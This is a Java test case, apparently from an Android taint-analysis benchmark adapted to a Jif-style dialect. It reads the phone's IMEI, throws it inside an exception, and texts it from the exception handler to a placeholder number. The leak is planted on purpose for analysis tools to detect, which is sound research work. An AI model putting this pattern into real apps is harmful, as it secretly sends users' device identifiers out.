package test;

import test.Activity;
import android.content.Context;
import android.os.Bundle;
import test.SmsManager;
import android.telephony.TelephonyManager;
import test.R;
import jif.runtime.Runtime;

/**
 * @testcase_name Exceptions4
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description tainted data is created, thrown as exception data and sent out in the exception handler
 * @dataflow source -> imei -> exception -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle exception data
	* ADAPTACIONES:
	* - 35 y 38 Try-catch NullPointerExceptions
 */
public class Exceptions4 extends Activity {

    @Override
    protected void onCreate{}(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout);
        try {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String imei = telephonyManager.getDeviceId();
            throw new RuntimeException(imei);
        } catch (RuntimeException ex) {
            try {
                SmsManager sm = SmsManager.getDefault();
                sm.sendTextMessage("+49 1234", null, ex.getMessage(), null, null);
            } catch (NullPointerException e) {
            }
        }
    }
}
